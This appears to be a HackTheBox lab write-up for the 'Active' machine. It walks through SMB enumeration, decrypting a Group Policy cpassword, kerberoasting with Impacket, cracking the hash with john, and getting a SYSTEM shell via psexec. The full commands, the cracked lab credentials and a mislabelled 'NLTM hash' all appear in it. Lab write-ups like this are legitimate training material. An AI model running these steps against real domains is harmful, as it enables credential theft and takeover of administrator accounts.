---
title: HTB -- Active
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/active/teaser.png
excerpt: This box has a unique foothold via exposed credentials. After footholding, we find that kerberoasting is possible, leading to Administrator access.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - kerberos
  - ad
---

### Summary
![](/assets/images/htb/active/teaser.png)
This box has a unique foothold via exposed credentials. After footholding, we find that kerberoasting is possible, leading to Administrator access.

### NMAP
```markdown
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-18 11:43 EST
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.11s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-18 16:50:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
|_sslv2-drown: 
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
|_sslv2-drown: 
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
|_sslv2-drown: 
3269/tcp  open  tcpwrapped
|_sslv2-drown: 
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```

## SMB

* `enum4linux -a -u "" -p "" 10.10.10.100 > enum.txt`
* `smbmap -H 10.10.10.100 -R`
  * Shows an open drive

### SMB - Replication drive

We can grab all the files from this share with a single command!

```
smbget -R smb://active.htb/Replication 
```

Anything with an extension could be of interest, at first glance `Groups.xml` jumps out. Sure enough, it contains a `cpassword` field which is talked about at length in [this article](https://adsecurity.org/?p=2288)

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>                 
```

&#x20;This is an `NLTM` hash and can be broken with the following command

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Awesome, we hae creds for svc\_tgs -- which likely stands for service ticket granting server (related to kerberos). New creds? Take a step back and re-run scans with updated permissions.

```
smbmap -H 10.10.10.100 -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -R 
...
        .\Users\SVC_TGS\Desktop\*
        dr--r--r--                0 Sat Jul 21 11:14:42 2018    .
        dr--r--r--                0 Sat Jul 21 11:14:42 2018    ..
        fr--r--r--               34 Sat Jul 21 11:14:42 2018    user.txt
```

User owned, now onto root.

## Kerberoast

Whenever service accounts are owned and AD is involved, the change of kerberoasting being possible is very high. My weapon of choice is impackets `GetUserSPNs.py` although there are several methods for Kerberoasting.

One important item to note is clock skew, which can be corrected with an `ntpdate` to the server

* Common errors
  * `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`
    * `ntpdate <victim ip>`
  * Impacket versioning can be tricky, try other versions or methods as a sanity check

```
sudo GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out                                    
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation                                                       
                                   
Password:                                                                                                                                    
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation               
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------               
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783  
```

After kerberosting (convieniently) the Administrator account, we must crack it's hash.

```
cat GetUserSPNs.out       
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$69bcf249b74aa5b5c3563429d0ed9dc3$fbddc9210a2a99081146c85483d80554834f3946a4ed619dac5712157cb2d30f0eee3e14728a92fb418e0a16b9a8d962eab49404a096f955a6327a48ec88a53ba08c7d3bd9543e6ffee47089643971a83af242673ab557deca9dd04083e504a10fdc524eaedfcfd12e46f6729fe7cbcddb601f5c942bcef59307f33ee25084304abb4bf366044655f8bf34383fecfdf752b2aaae2eaa9fd8a2d3e9ee39d1e476b21f6bb492ebade89480e801851ef2ebaec63ed8fd70155737a5d6f5f21081e8f410899a45226f8354ad0db5a366c46b5fba675cb017988c99513186d0d7efca2e7c83fa6a366868fbf9bb15100c60c6743bbf65f6986d551517b57cea9b1dadc2807c59e04670d3a450e34e85f5c295cd5214b93cde364d493131875afba83b790428db1a22cfa8e3ff638a06c23bc17a88b0741baa9e931586683ba1c2e214e975003397402b77521e80fb75fa6149b6db0abdae846136ec96d0fcc9f5395b906b22140e71010be0143087b57f30c4ffc435ad3775ae0b63d7cd644063d9a4d816d0c49eae8cf1c6ebc255ccd58d98b68f8cbd208688498fe74d6be6fdb91cbed886a44460e9a6d4d555c35fa5a857684124c3b21d90eebd725bc2ad0e4fbd8fb2179b841d240cf806fea1b81f311e37c46b0c89c7c5530eeb25ffa3b4f5f1cb92387a1e8e76bf10ef522540cdaa0fd429422f6e4bf4aa4abc7af1a000f3ad5107ffc05290ba4c8563040687582148e59703be5e76148719474c4dd3451d49d99b8385bc35878b3f2da2d7247bd4bf7cba3078bb439be0b8ea3f3b0a56ca65f74a125d315f3c3a6d0bc92bebc3c07252b2fce994349718f5eef276e5001b10c37358b6e9c54a42d897764e54041b4e9ccbfdb2802cb09b85105471b7a83b2c50f390647d1e737d1c5fe9070e1bae73489605b7ac83aae0e801dfa14931081ce59ed4675fda86ecf0f56e9edd5957572d82c94c5f649a9e69a74fdeadad3fd3f08ce97fe05051b0ef8abc270d6cb223273d0174a9f54d68eac59d627a81ac0c2331c9fa15bc0456d306342922f58a00001cda80c0362c4a8303637b59f3edc14833f73736764ca9f5ab95c5c0ad058845fa36035c91114239cacbc05ac38186534195aff724945feadcce05fd8cbae77aa4f5c055b942010ca292da39f49d897fe7bbe08c5a3d804cec7e0449025faa5958cbf2419962872e369ea222b758fab25a4d841783adb68557a6f54a3a66c78316dfe29d9c2439b2a6  

john GetUserSPNs.out --wordlist=~/rockyou.txt                                    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:06 DONE (2022-01-09 15:32) 0.1434g/s 1511Kp/s 1511Kc/s 1511KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Excellent, we can now login as `Administrator:Ticketmaster1968`

```
./psexec.py active.htb/administrator@10.10.10.100                                                                                    1 ⨯
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
                                                                                                                                             
┌──(kali㉿kali)-[~/impacket/examples]
└─$ ./psexec.py active.htb/administrator@10.10.10.100                                                                                    1 ⨯
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file GuLsJtCN.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ugiH on 10.10.10.100.....
[*] Starting service ugiH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Root!

